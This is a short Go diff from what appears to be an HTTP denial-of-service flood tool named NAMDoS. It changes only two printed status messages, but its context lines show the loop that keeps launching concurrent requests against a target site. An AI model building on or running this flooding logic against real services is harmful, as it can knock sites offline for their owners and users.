@@ -120,12 +120,12 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("-- NAMDoS Attack Started --\n           Go!\n\n")
+		fmt.Println("-- NAMDoS Attack Started! --\n           Go!\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
 		)
-		fmt.Println("In use               |\tResp OK |\tGot err")
+		fmt.Println("In use               |\tResp OK |\tGot error")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
